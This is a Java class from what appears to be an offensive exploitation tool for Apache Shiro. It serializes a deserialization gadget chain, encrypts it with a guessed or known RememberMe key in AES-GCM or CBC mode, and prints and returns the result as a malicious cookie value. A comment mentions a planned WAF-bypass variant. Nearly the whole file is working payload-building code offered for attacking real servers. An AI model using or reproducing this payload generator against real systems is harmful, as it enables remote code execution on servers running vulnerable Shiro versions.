package com.liev.clouds.utils.shiroutils;

import com.liev.clouds.exp.shiro.AttackService;
import com.liev.clouds.payload.shiro.encrypt.CbcEncrypt;
import com.liev.clouds.payload.shiro.encrypt.ShiroGCM;
import com.liev.clouds.payload.shiro.FramePayload;
import com.mchange.v2.ser.SerializableUtils;


import javax.xml.bind.DatatypeConverter;



public class Shiro implements FramePayload {
    public Shiro() {
    }

    @Override
    public String sendpayload(Object ChainObject) throws Exception {
        return null;
    }

    @Override
    public String sendpayload(Object chainObject, String shiroKeyWord, String key) throws Exception {
        byte[] serpayload = SerializableUtils.toByteArray(chainObject);
        byte[] bkey = DatatypeConverter.parseBase64Binary(key);
        byte[] encryptpayload = null;
//        byte[] encryptpayload;
        if (AttackService.aesGcmCipherType == 1) {
//            CipherService cipherService = new AesCipherService();
//            ByteSource byteSource = cipherService.encrypt(serpayload, bkey);
//            encryptpayload = byteSource.getBytes();
//            GcmEncrypt gcmEncrypt = new GcmEncrypt();
            ShiroGCM shiroGCM = new ShiroGCM();
            String byteSource = shiroGCM.encrypt(key,serpayload);
//            String byteSource = gcmEncrypt.encrypt(key, serpayload);
//            encryptpayload = byteSource.getBytes();
            System.out.println(shiroKeyWord + "=" + byteSource);
            return shiroKeyWord + "=" + byteSource;

        } else {
//            encryptpayload = AesUtil.encrypt(serpayload, bkey);
            CbcEncrypt cbcEncrypt = new CbcEncrypt();
            String byteSource = cbcEncrypt.encrypt(key, serpayload);
            System.out.println(shiroKeyWord + "=" + byteSource);
            return shiroKeyWord + "=" + byteSource;
        }

//增加绕waf的方法，暂不开启。by @by3 @liuwa
        //return shiroKeyWord +  "=" +"...." + DatatypeConverter.printBase64Binary(encryptpayload);
//		return shiroKeyWord + "=" + DatatypeConverter.printBase64Binary(encryptpayload);

    }
//    @Override
//    public String sendpayload(Object chainObject, String shiroKeyWord, String key) throws Exception {
//        byte[] serpayload = SerializableUtils.toByteArray(chainObject);
//        byte[] bkey = DatatypeConverter.parseBase64Binary(key);
//        byte[] encryptpayload = null;
//    //        byte[] encryptpayload;
//        if (AttackService.aesGcmCipherType == 1) {
//    //            CipherService cipherService = new AesCipherService();
//    //            ByteSource byteSource = cipherService.encrypt(serpayload, bkey);
//    //            encryptpayload = byteSource.getBytes();
//            GcmEncrypt gcmEncrypt = new GcmEncrypt();
//            String byteSource = gcmEncrypt.encrypt(key,serpayload);
//    //            encryptpayload = byteSource.getBytes();
//            System.out.println(shiroKeyWord + "=" + byteSource);
//            return shiroKeyWord + "=" + byteSource;
//
//        } else {
//            encryptpayload = AesUtil.encrypt(serpayload, bkey);
//        }
//
//        return shiroKeyWord + "=" + DatatypeConverter.printBase64Binary(encryptpayload);
//    }

}



